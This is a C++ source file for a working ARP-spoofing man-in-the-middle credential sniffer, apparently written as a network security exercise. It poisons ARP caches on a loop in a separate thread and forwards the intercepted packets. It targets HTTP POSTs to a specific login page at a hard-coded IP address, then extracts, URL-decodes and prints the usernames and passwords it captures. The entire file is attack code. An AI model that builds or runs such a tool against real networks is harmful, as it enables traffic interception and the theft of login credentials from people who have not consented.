#include "Net.h"
#include <cstdlib>
#include <pthread.h>
#include <unistd.h>

using namespace std;

void url_decode(char*);
void* arp_spoofing(void*);
string target_request = "POST /login/login_results.asp";
uint8_t target_ip_arr[4] = {163, 182, 194, 25};
Net* net;

int main(int argc, char** argv){
    net = new Net((argc < 2) ? "" : argv[1]);
    net->get_net_mac();
    net->print_net_mac();
    net->arp_spoofing();

    pthread_t thread;
    pthread_create(&thread, NULL, arp_spoofing, NULL); // Create a new thread to do ARP spoofing periodically

    uint32_t target_ip = (target_ip_arr[0] << 24) + (target_ip_arr[1] << 16) + (target_ip_arr[2] << 8) + target_ip_arr[3];

    while (true) {
        tcp_packet buf;
        memset(&buf, 0, sizeof(buf));
        int len = recvfrom(net->get_forward_sock(), &buf, ETH_FRAME_LEN, 0, NULL, NULL);
        if (len > 0) net->forward_ipv4(&buf, len);
        
        int payload_len;
        if (ntohl(buf.ip_hdr.daddr) == target_ip && !strncmp(buf.data, target_request.c_str(), target_request.length()-5)) { // Found the packet that contains username/password        
            // Get the payload length
            for (int i = 0; ; i++) {
                if (buf.data[i] == '\r' && buf.data[i+1] == '\n') {
                    if (sscanf(&buf.data[i+2], "Content-Length: %d\r\n", &payload_len)) break;
                }
            }
            // Get username/password
            char username[BUF_SIZE], password[BUF_SIZE];
            if(sscanf(&buf.data[len - ETH_HDR_LEN - IPV4_HDR_LEN - TCP_HDR_LEN - payload_len], "txtUsername=%[^&]&txtPassword=%[^&]", username, password)) {
                url_decode(username); url_decode(password);
                cout << "Username: " << username << endl << "Password: " << password << endl << endl;
            }
        }
    }

    pthread_cancel(thread);
    delete(net);

    return 0;
}

void* arp_spoofing(void* args) {
    while (true) {
        usleep(ARP_SPOOFING_PERIOD);
        // net->get_net_mac(); // It cannot add ARP table entries from user space, so it has to detect whether there are new devices before do ARP spoofing
        net->arp_spoofing();
    }
    return NULL;
}

unsigned char convert_hex(char c) {
    unsigned char result;
    if (c >= '0' && c <= '9') result = c - '0';
    else if (c >= 'a' && c <= 'f') result = c - 'a' + 10;
    else if (c >= 'A' && c <= 'F') result = c - 'A' + 10;
    else {
        perror("convert_hex() failed"); exit(EXIT_FAILURE);
    }
    return result;
}

void url_decode(char* str) {
    string tmp;
    for (int i = 0; str[i] != '\0'; i++) {
        if (str[i] == '+') tmp += " ";
        else if (str[i] == '%') {
            unsigned char first = convert_hex(str[++i]);
            unsigned char second = convert_hex(str[++i]);
            tmp += ((first << 4) + second);
        }
        else tmp += str[i];
    }
    strcpy(str, tmp.c_str());
}
